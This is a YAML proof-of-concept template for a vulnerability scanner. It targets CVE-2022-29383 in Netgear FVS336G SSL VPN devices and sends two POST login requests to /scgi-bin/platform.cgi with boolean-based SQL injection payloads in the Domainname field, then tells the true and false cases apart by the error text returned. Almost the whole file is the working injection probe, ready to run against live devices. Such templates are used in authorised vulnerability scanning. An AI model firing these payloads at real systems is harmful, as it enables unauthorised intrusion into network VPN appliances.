name: poc-yaml-netgear-ssl-vpn-20211222-cve-2022-29383
binding: b892485c-e8d6-4e2c-bc5c-8d1333efae59
manual: true
detail:
    author: xiaobaicai
    links:
        - https://github.com/badboycxcc/Netgear-ssl-vpn-20211222-CVE-2022-29383
    vulnerability:
        id: CT-430812
        level: critical
    version: FVS336Gv2 - FVS336Gv3
transport: http
set:
    s1: randomLowercase(5)
    a1: randomInt(1000, 9000)
    a2: randomInt(1000, 9000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /scgi-bin/platform.cgi
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: thispage=index.htm&USERDBUsers.UserName=aaa&USERDBUsers.Password=aaa&USERDBDomains.Domainname=geardomain%27 and {{a1}}={{a2}} and %27{{s1}}%27=%27{{s1}}&button.login.USERDBUsers.router_status=Login&Login.userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%3B+Trident%2F7.0%3B+.NET4.0C%3B+.NET4.0E%3B+.NET+CLR+2.0.50727%3B+.NET+CLR+3.0.30729%3B+.NET+CLR+3.5.30729%3B+rv%3A11.0%29+like+Gecko
            follow_redirects: true
        expression: response.body.bcontains(b"id=\"lblWarning\">User authentication Failed")
    r1:
        request:
            cache: true
            method: POST
            path: /scgi-bin/platform.cgi
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: thispage=index.htm&USERDBUsers.UserName=aaa&USERDBUsers.Password=aaa&USERDBDomains.Domainname=geardomain%27 and {{a1}}={{a1}} and %27{{s1}}%27=%27{{s1}}&button.login.USERDBUsers.router_status=Login&Login.userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%3B+Trident%2F7.0%3B+.NET4.0C%3B+.NET4.0E%3B+.NET+CLR+2.0.50727%3B+.NET+CLR+3.0.30729%3B+.NET+CLR+3.5.30729%3B+rv%3A11.0%29+like+Gecko
            follow_redirects: true
        expression: response.body.bcontains(b"id=\"lblWarning\">User Login Failed for SSLVPN User")
expression: r0()
